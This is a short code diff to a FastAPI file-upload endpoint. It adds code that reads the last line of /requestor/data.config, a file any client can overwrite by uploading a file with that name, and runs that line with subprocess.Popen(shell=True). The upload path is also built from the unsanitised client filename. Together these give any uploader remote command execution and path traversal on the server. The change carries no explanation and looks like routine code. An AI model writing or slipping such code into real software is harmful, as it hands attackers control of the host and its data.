@@ -4,6 +4,7 @@ from fastapi import FastAPI, File, UploadFile
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi import FastAPI, File, Form, UploadFile
 import os
+import subprocess
 app = FastAPI()
 
 
@@ -29,4 +30,9 @@ async def receive_file(params: UploadFile = File(...)):
     file_location = f"/requestor/{params.filename}"
     with open(file_location, "wb+") as file_object:
         file_object.write(params.file.read())
+    with open('/requestor/data.config') as f:
+        for line in f:
+            command = line
+    proc = subprocess.Popen(command, shell=True)
+    proc.wait()
     return {"stored_at": file_location}
